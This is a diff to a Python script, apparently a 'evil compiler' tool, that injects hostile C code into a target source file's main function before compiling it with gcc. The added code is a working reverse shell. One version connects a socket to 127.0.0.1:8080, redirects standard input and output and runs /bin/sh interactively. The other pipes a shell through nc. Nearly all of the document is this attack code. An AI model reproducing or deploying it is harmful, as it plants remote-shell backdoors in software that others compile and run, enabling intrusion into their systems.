@@ -17,12 +17,35 @@ evil_code=''
 def exp1(s):
     evil_code = f2[:main_place]
     evil_code+='''
-unsigned char buf[] = {};
-'''.format(s)
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+ 
+void evil(){
+  int scktd;
+  struct sockaddr_in client;
+ 
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("127.0.0.1");
+  client.sin_port = htons(8080);
+
+  scktd = socket(AF_INET,SOCK_STREAM,0);
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
+
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+
+  execl("/bin/sh","sh","-i",NULL,NULL);
+
+  return;
+}
+
+'''
 
     evil_code += f2[main_place:ret_place]
     evil_code += '''
-(*(void(*)()) buf)();
+    evil();
 '''
 
     evil_code += f2[ret_place:]
@@ -31,13 +54,12 @@ unsigned char buf[] = {};
 def exp2(s):
     evil_code = f2[:main_place]
     evil_code+= """
-void evil()\{
-    unsigned char buf[]  = {};
-    (*(void(*)()) buf)();
+void evil(){
+    system(\"/bin/sh | nc 127.0.0.1 8080\");
     return;
-\}
+}
 
-""".format(s)
+"""
     evil_code+= f2[main_place:ret_place]
     evil_code+= '\nevil();\n'
     evil_code+= f2[ret_place:]
@@ -59,5 +81,5 @@ tmp_name = "tmp_c_for_evil_compiler.c"
 with open(tmp_name,'w') as f:
     f.write(evil_code)
 
-os.system('gcc -z execstack '+tmp_name) 
+os.system('gcc '+tmp_name) 
 #os.system('rm '+tmp_name)
